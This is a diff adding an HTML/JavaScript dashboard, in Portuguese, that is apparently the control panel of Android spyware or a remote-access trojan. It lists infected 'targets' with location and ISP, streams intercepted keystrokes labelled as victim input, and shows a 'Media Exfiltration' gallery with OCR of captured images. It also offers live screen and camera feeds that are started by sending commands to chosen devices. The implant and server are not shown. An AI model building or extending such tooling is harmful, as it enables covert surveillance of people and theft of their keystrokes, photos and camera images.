@@ -1,0 +1,491 @@
+<!-- language: HTML, file: index.html -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS // Tactical OS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+    <style>
+        :root {
+            --bg-void: #03050A;
+            --bg-panel: #0A0F1A;
+            --glass: rgba(13, 20, 33, 0.65);
+            --border-light: rgba(255, 255, 255, 0.06);
+            --accent-cyan: #00F0FF;
+            --accent-purple: #7000FF;
+            --accent-pink: #FF0055;
+            --text-bright: #FFFFFF;
+            --text-dim: #6B7A90;
+            --font-ui: 'Space Grotesk', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            background-color: var(--bg-void);
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 30px 30px;
+            color: var(--text-bright);
+            font-family: var(--font-ui);
+            height: 100vh;
+            display: flex;
+            overflow: hidden;
+        }
+
+        .ambient-glow {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 80% 20%, rgba(112, 0, 255, 0.08) 0%, transparent 40%),
+                        radial-gradient(circle at 20% 80%, rgba(0, 240, 255, 0.08) 0%, transparent 40%);
+            z-index: 0; pointer-events: none;
+        }
+
+        /* --- SIDEBAR VERTICAL --- */
+        .sidebar {
+            width: 90px; height: 100vh; background: var(--bg-panel);
+            border-right: 1px solid var(--border-light); display: flex; flex-direction: column;
+            align-items: center; padding: 25px 0; z-index: 10;
+        }
+
+        /* ESTILO DA LOGO (CAVEIRA) */
+        .brand {
+            width: 60px; height: 60px; margin-bottom: 40px;
+            display: flex; justify-content: center; align-items: center;
+            position: relative;
+        }
+        .brand img {
+            width: 100%; height: 100%; object-fit: contain;
+            /* Efeito de brilho azul neon */
+            filter: drop-shadow(0 0 8px rgba(0, 240, 255, 0.8));
+            transition: 0.3s ease;
+        }
+        .brand img:hover {
+            filter: drop-shadow(0 0 15px rgba(0, 240, 255, 1));
+            transform: scale(1.1);
+        }
+
+        .nav-item {
+            width: 50px; height: 50px; margin-bottom: 15px; border-radius: 12px;
+            display: flex; justify-content: center; align-items: center;
+            color: var(--text-dim); cursor: pointer; transition: 0.3s;
+            position: relative; font-size: 1.2rem;
+        }
+        .nav-item:hover { color: var(--text-bright); background: rgba(255,255,255,0.03); }
+        .nav-item.active { color: var(--accent-cyan); background: rgba(0, 240, 255, 0.1); }
+        .nav-item.active::before {
+            content: ''; position: absolute; left: -30px; width: 4px; height: 20px;
+            background: var(--accent-cyan); border-radius: 0 4px 4px 0; box-shadow: 0 0 10px var(--accent-cyan);
+        }
+
+        /* --- ÁREA PRINCIPAL --- */
+        .main-wrapper { flex: 1; display: flex; flex-direction: column; z-index: 10; position: relative; }
+
+        .topbar {
+            height: 70px; border-bottom: 1px solid var(--border-light);
+            display: flex; justify-content: space-between; align-items: center; padding: 0 30px;
+            background: rgba(3, 5, 10, 0.5); backdrop-filter: blur(10px);
+        }
+        .topbar-title { font-size: 1.1rem; font-weight: 600; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; }
+        .status-dot { width: 8px; height: 8px; background: #00FF66; border-radius: 50%; box-shadow: 0 0 10px #00FF66; }
+        .topbar-stats { display: flex; gap: 30px; font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-dim); }
+        .topbar-stats span { color: var(--accent-cyan); }
+
+        .dashboard { flex: 1; padding: 30px; display: flex; flex-direction: column; gap: 25px; overflow-y: auto; }
+        .tab-content { display: none; flex-direction: column; gap: 25px; height: 100%; }
+        .tab-content.active { display: flex; animation: fadeScale 0.4s ease; }
+        @keyframes fadeScale { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+
+        .panel {
+            background: var(--glass); border: 1px solid var(--border-light);
+            border-radius: 4px; backdrop-filter: blur(20px); position: relative; overflow: hidden;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+        .panel::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 20px; height: 2px;
+            background: var(--accent-cyan); box-shadow: 0 0 10px var(--accent-cyan);
+        }
+        
+        .panel-header {
+            padding: 15px 20px; border-bottom: 1px solid var(--border-light);
+            font-size: 0.85rem; font-weight: 600; letter-spacing: 0.5px;
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(255,255,255,0.01);
+        }
+        .panel-header span { font-family: var(--font-mono); color: var(--text-dim); font-weight: 400; font-size: 0.75rem; }
+        .panel-body { padding: 20px; }
+
+        .grid-top { display: grid; grid-template-columns: 2fr 1fr; gap: 25px; height: 300px; }
+        .grid-bottom { display: grid; grid-template-columns: 1fr; gap: 25px; flex: 1; }
+
+        #map { width: 100%; height: 100%; background: #000; }
+        .leaflet-layer { filter: grayscale(100%) invert(100%) contrast(120%) brightness(50%) sepia(100%) hue-rotate(180deg) saturate(300%); }
+
+        .data-table { width: 100%; border-collapse: collapse; font-family: var(--font-mono); font-size: 0.8rem; }
+        .data-table th { padding: 12px 15px; text-align: left; color: var(--text-dim); font-weight: 400; border-bottom: 1px solid var(--border-light); text-transform: uppercase; letter-spacing: 1px; }
+        .data-table td { padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .data-table tr:hover { background: rgba(0, 240, 255, 0.03); cursor: crosshair; }
+        
+        .tag { padding: 4px 10px; border-radius: 2px; font-size: 0.7rem; font-weight: 700; letter-spacing: 0.5px; }
+        .tag-online { background: rgba(0, 255, 102, 0.1); color: #00FF66; border: 1px solid rgba(0, 255, 102, 0.3); }
+        .tag-offline { background: rgba(255, 0, 85, 0.1); color: var(--accent-pink); border: 1px solid rgba(255, 0, 85, 0.3); }
+
+        .btn {
+            background: transparent; color: var(--text-bright); border: 1px solid var(--border-light);
+            padding: 8px 16px; font-family: var(--font-ui); font-size: 0.8rem; font-weight: 600;
+            cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 8px;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn:hover { border-color: var(--accent-cyan); color: var(--accent-cyan); box-shadow: 0 0 15px rgba(0, 240, 255, 0.1); }
+        .btn-primary { background: var(--accent-cyan); color: #000; border-color: var(--accent-cyan); }
+        .btn-primary:hover { background: #fff; box-shadow: 0 0 20px rgba(0, 240, 255, 0.4); }
+        .btn-danger { border-color: rgba(255, 0, 85, 0.5); color: var(--accent-pink); }
+        .btn-danger:hover { background: rgba(255, 0, 85, 0.1); border-color: var(--accent-pink); box-shadow: 0 0 15px rgba(255, 0, 85, 0.2); }
+
+        .terminal-wrapper { background: #000; border-radius: 4px; border: 1px solid var(--border-light); flex: 1; display: flex; flex-direction: column; }
+        .terminal-output { padding: 20px; font-family: var(--font-mono); font-size: 0.85rem; color: #A9B7C6; overflow-y: auto; flex: 1; line-height: 1.6; }
+        .term-line { margin-bottom: 5px; }
+        .term-cmd { color: var(--accent-cyan); }
+        .term-input-line { display: flex; padding: 15px 20px; border-top: 1px solid var(--border-light); background: rgba(255,255,255,0.02); }
+        .term-symbol { color: var(--accent-cyan); font-family: var(--font-mono); margin-right: 10px; font-weight: bold; }
+        .term-input { background: transparent; border: none; color: #fff; font-family: var(--font-mono); font-size: 0.85rem; width: 100%; outline: none; }
+
+        .intel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; height: 100%; }
+        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 15px; overflow-y: auto; padding-right: 5px; }
+        .media-card { position: relative; border-radius: 4px; overflow: hidden; border: 1px solid var(--border-light); }
+        .media-card img { width: 100%; height: 110px; object-fit: cover; filter: grayscale(50%); transition: 0.3s; }
+        .media-card:hover img { filter: grayscale(0%); transform: scale(1.05); }
+        .media-info { position: absolute; bottom: 0; width: 100%; padding: 8px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); font-family: var(--font-mono); font-size: 0.65rem; }
+        .ocr-txt { color: var(--accent-cyan); display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; height: 100%; }
+        .video-box { background: #000; border: 1px solid var(--border-light); border-radius: 4px; display: flex; justify-content: center; align-items: center; position: relative; overflow: hidden; }
+        .video-box::after {
+            content: 'REC'; position: absolute; top: 15px; right: 15px; color: var(--accent-pink); font-family: var(--font-mono); font-size: 0.7rem;
+            animation: blink 1s infinite; opacity: 0.8;
+        }
+        .video-box img { width: 100%; height: 100%; object-fit: contain; }
+
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="ambient-glow"></div>
+
+    <nav class="sidebar">
+        <!-- LOGO CAVEIRA -->
+        <div class="brand">
+            <img src="https://i.postimg.cc/tgsTZhDM/logonexus.png" alt="NEXUS">
+        </div>
+        
+        <div class="nav-item active" onclick="switchTab('devices', this)" title="Alvos">
+            <i class="fa-solid fa-crosshairs"></i>
+        </div>
+        <div class="nav-item" onclick="switchTab('intel', this)" title="Inteligência (Keylogger)">
+            <i class="fa-solid fa-keyboard"></i>
+        </div>
+        <div class="nav-item" onclick="switchTab('terminal', this)" title="Terminal">
+            <i class="fa-solid fa-terminal"></i>
+        </div>
+        <div class="nav-item" onclick="switchTab('remote', this)" title="Streaming">
+            <i class="fa-solid fa-video"></i>
+        </div>
+    </nav>
+
+    <div class="main-wrapper">
+        
+        <header class="topbar">
+            <div class="topbar-title">
+                <div class="status-dot"></div> NEXUS // DASHBOARD
+            </div>
+            <div class="topbar-stats">
+                <div>UPTIME: <span>99.9%</span></div>
+                <div>PING: <span>24ms</span></div>
+                <div>PROXY: <span>ROTATING</span></div>
+            </div>
+        </header>
+
+        <div class="dashboard">
+            
+            <div id="tab-devices" class="tab-content active">
+                <div class="grid-top">
+                    <div class="panel">
+                        <div class="panel-header">Mapa Tático Global <span>REAL-TIME</span></div>
+                        <div class="panel-body" style="padding:0; height: calc(100% - 50px);">
+                            <div id="map"></div>
+                        </div>
+                    </div>
+                    <div class="panel" style="display: flex; flex-direction: column;">
+                        <div class="panel-header">Telemetria de Rede <span>LIVE</span></div>
+                        <div class="panel-body" style="flex:1; position: relative;">
+                            <canvas id="networkChart"></canvas>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid-bottom">
+                    <div class="panel">
+                        <div class="panel-header">
+                            Alvos Conectados 
+                            <button class="btn btn-primary" onclick="fetchData()" style="padding: 4px 10px; font-size: 0.7rem;">Sincronizar</button>
+                        </div>
+                        <div class="panel-body" style="padding: 0;">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Hardware ID</th>
+                                        <th>Localização / ISP</th>
+                                        <th>OS</th>
+                                        <th>Bateria</th>
+                                        <th>Status</th>
+                                        <th>Ação</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="device-table-body"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-intel" class="tab-content">
+                <div class="intel-grid">
+                    <div class="panel" style="display: flex; flex-direction: column;">
+                        <div class="panel-header">Keylogger Intercept <span>STREAM</span></div>
+                        <div class="terminal-wrapper" style="border: none; border-radius: 0; flex: 1;">
+                            <div class="terminal-output" id="keylog-container">
+                                <div class="term-line" style="color:var(--text-dim)">Awaiting victim input...</div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="panel" style="display: flex; flex-direction: column;">
+                        <div class="panel-header">Media Exfiltration <span>OCR ENABLED</span></div>
+                        <div class="panel-body" style="flex: 1; overflow-y: auto;">
+                            <div class="media-grid" id="media-container"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-terminal" class="tab-content">
+                <div class="panel" style="flex: 1; display: flex; flex-direction: column;">
+                    <div class="panel-header">Root Shell <span>SYS_ADMIN</span></div>
+                    <div class="terminal-wrapper" style="border: none; border-radius: 0; flex: 1;">
+                        <div class="terminal-output" id="terminal-output" onclick="document.getElementById('term-input').focus()">
+                            <div class="term-line"><span style="color:var(--accent-purple)">[SYSTEM]</span> NEXUS OS v3.0.1 initialized.</div>
+                            <div class="term-line"><span style="color:var(--accent-purple)">[SYSTEM]</span> Type 'help' to list commands.</div>
+                        </div>
+                        <div class="term-input-line">
+                            <span class="term-symbol">➜</span>
+                            <input type="text" id="term-input" class="term-input" autocomplete="off" onkeydown="handleTerminal(event)" placeholder="Enter command...">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-remote" class="tab-content">
+                <div class="panel" style="flex: 1; display: flex; flex-direction: column;">
+                    <div class="panel-header">
+                        Live Feed <span id="current-target" style="color:var(--accent-pink)">TARGET: NONE</span>
+                        <div style="display:flex; gap:10px;">
+                            <button class="btn btn-primary" onclick="startStream()">Connect Feed</button>
+                            <button class="btn btn-danger" onclick="stopStream()">Terminate</button>
+                        </div>
+                    </div>
+                    <div class="panel-body" style="flex: 1;">
+                        <div class="video-grid">
+                            <div class="video-box">
+                                <span id="screen-placeholder" style="position:absolute; color:var(--text-dim); font-family:var(--font-mono);">NO_SIGNAL</span>
+                                <img id="screen-player" style="display: none;">
+                            </div>
+                            <div class="video-box">
+                                <span id="camera-placeholder" style="position:absolute; color:var(--text-dim); font-family:var(--font-mono);">NO_SIGNAL</span>
+                                <img id="camera-player" style="display: none;">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let currentDeviceId = null;
+
+        const map = L.map('map', { zoomControl: false, attributionControl: false }).setView([-14.235, -51.925], 4);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+        Chart.defaults.color = '#6B7A90';
+        Chart.defaults.font.family = "'JetBrains Mono', monospace";
+        
+        const ctxNet = document.getElementById('networkChart').getContext('2d');
+        let gradientNet = ctxNet.createLinearGradient(0, 0, 0, 300);
+        gradientNet.addColorStop(0, 'rgba(0, 240, 255, 0.2)');
+        gradientNet.addColorStop(1, 'rgba(0, 240, 255, 0)');
+
+        const networkChart = new Chart(ctxNet, {
+            type: 'line',
+            data: {
+                labels: ['1','2','3','4','5','6','7','8','9','10'],
+                datasets: [{
+                    data: [45, 52, 38, 60, 48, 42, 55, 40, 45, 41],
+                    borderColor: '#00F0FF',
+                    backgroundColor: gradientNet,
+                    borderWidth: 2, tension: 0.4, fill: true, pointRadius: 0
+                }]
+            },
+            options: { 
+                responsive: true, maintainAspectRatio: false, 
+                plugins: { legend: { display: false } }, 
+                scales: { x: { display: false }, y: { display: false, min: 0, max: 100 } },
+                layout: { padding: 10 }
+            }
+        });
+
+        socket.on('device_update', fetchData);
+        socket.on('new_keylog', (data) => {
+            const container = document.getElementById('keylog-container');
+            container.innerHTML += `<div class="term-line"><span style="color:var(--accent-pink)">[${data.app}]</span> ${data.text}</div>`;
+            container.scrollTop = container.scrollHeight;
+        });
+        socket.on('new_media', () => fetchData());
+        socket.on('video_frame', (data) => {
+            if (data.id !== currentDeviceId) return;
+            const img = document.getElementById(data.type === 'screen' ? 'screen-player' : 'camera-player');
+            const ph = document.getElementById(data.type === 'screen' ? 'screen-placeholder' : 'camera-placeholder');
+            ph.style.display = 'none'; img.style.display = 'block';
+            img.src = 'data:image/jpeg;base64,' + data.frame;
+        });
+
+        function switchTab(tabId, el) {
+            document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(p => p.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById(`tab-${tabId}`).classList.add('active');
+        }
+
+        async function fetchData() {
+            const res = await fetch('/api/dashboard');
+            const data = await res.json();
+            renderDevices(data.devices);
+            renderMedia(data.media);
+            updateMap(data.devices);
+        }
+
+        function renderDevices(devices) {
+            const tbody = document.getElementById('device-table-body');
+            tbody.innerHTML = devices.length === 0 ? '<tr><td colspan="6" style="text-align:center; color:var(--text-dim); padding: 20px;">NO_TARGETS_FOUND</td></tr>' : '';
+            
+            devices.forEach(d => {
+                const isOnline = d.status === 'online';
+                tbody.innerHTML += `
+                    <tr>
+                        <td style="color:#fff; font-weight:600;">${d.model}<br><span style="color:var(--text-dim); font-size:0.7rem; font-weight:400;">${d.id.substring(0,12)}</span></td>
+                        <td>${d.city}<br><span style="color:var(--text-dim); font-size:0.7rem;">${d.isp}</span></td>
+                        <td>Android ${d.android_version}</td>
+                        <td style="color:${d.battery > 20 ? 'var(--accent-cyan)' : 'var(--accent-pink)'};">${d.battery}</td>
+                        <td><span class="tag ${isOnline ? 'tag-online' : 'tag-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span></td>
+                        <td><button class="btn" style="padding: 4px 8px; font-size:0.7rem;" onclick="setTarget('${d.id}')">ACCESS</button></td>
+                    </tr>`;
+            });
+        }
+
+        function renderMedia(mediaList) {
+            const grid = document.getElementById('media-container');
+            grid.innerHTML = mediaList.length === 0 ? '<div style="color:var(--text-dim); font-family:var(--font-mono); font-size:0.8rem;">NO_MEDIA_FOUND</div>' : '';
+            mediaList.forEach(m => {
+                grid.innerHTML += `
+                    <div class="media-card">
+                        <img src="/uploads/${m.filename}" alt="Capture">
+                        <div class="media-info">
+                            <strong style="color:#fff;">${m.file_type.toUpperCase()}</strong>
+                            ${m.ocr_text ? `<span class="ocr-txt">OCR: ${m.ocr_text.substring(0,20)}...</span>` : ''}
+                        </div>
+                    </div>`;
+            });
+        }
+
+        function updateMap(devices) {
+            devices.forEach((d, i) => {
+                if (d.status === 'online') {
+                    const lat = -14.235 + (Math.random() * 10 - 5);
+                    const lon = -51.925 + (Math.random() * 10 - 5);
+                    L.circleMarker([lat, lon], { 
+                        radius: 5, color: '#FF0055', fillColor: '#FF0055', fillOpacity: 0.8, weight: 2 
+                    }).addTo(map).bindPopup(`<div style="font-family:monospace; color:#000;"><b>${d.model}</b><br>${d.city}</div>`);
+                }
+            });
+        }
+
+        function setTarget(id) {
+            currentDeviceId = id;
+            document.getElementById('current-target').innerText = `TARGET: ${id.substring(0,8)}`;
+            document.querySelectorAll('.nav-item')[3].click();
+        }
+
+        function startStream() {
+            if (!currentDeviceId) return alert("Selecione um alvo na tabela primeiro.");
+            fetch('/api/send_command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({device_id: currentDeviceId, command: 'start_stream'}) });
+        }
+
+        function stopStream() {
+            if (!currentDeviceId) return;
+            fetch('/api/send_command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({device_id: currentDeviceId, command: 'stop_stream'}) });
+            document.getElementById('screen-player').style.display = 'none';
+            document.getElementById('screen-placeholder').style.display = 'block';
+        }
+
+        function handleTerminal(e) {
+            if (e.key !== 'Enter') return;
+            const input = document.getElementById('term-input');
+            const val = input.value.trim();
+            if (!val) return;
+            
+            const output = document.getElementById('terminal-output');
+            output.innerHTML += `<div class="term-line"><span class="term-symbol">➜</span> ${val}</div>`;
+            input.value = '';
+
+            if (val === 'help') {
+                output.innerHTML += `
+                    <div class="term-line" style="color:var(--text-dim); margin-top: 10px;">Available commands:</div>
+                    <div class="term-line"><span style="color:var(--accent-cyan); width:80px; display:inline-block;">target</span> <span>Lock onto a device ID</span></div>
+                    <div class="term-line"><span style="color:var(--accent-cyan); width:80px; display:inline-block;">stream</span> <span>Start screen/cam feed</span></div>
+                    <div class="term-line"><span style="color:var(--accent-cyan); width:80px; display:inline-block;">clear</span> <span>Clear terminal output</span></div>
+                `;
+            } else if (val === 'clear') {
+                output.innerHTML = '';
+            } else if (val.startsWith('target ')) {
+                const id = val.split(' ')[1];
+                setTarget(id);
+                output.innerHTML += `<div class="term-line" style="color:var(--accent-cyan)">Target locked: ${id}</div>`;
+            } else if (val === 'stream') {
+                startStream();
+                output.innerHTML += `<div class="term-line" style="color:var(--accent-cyan)">Initializing feed...</div>`;
+            } else {
+                output.innerHTML += `<div class="term-line" style="color:var(--accent-pink)">Command not found. Type 'help' for a list.</div>`;
+            }
+            output.scrollTop = output.scrollHeight;
+        }
+
+        fetchData();
+    </script>
+</body>
+</html>
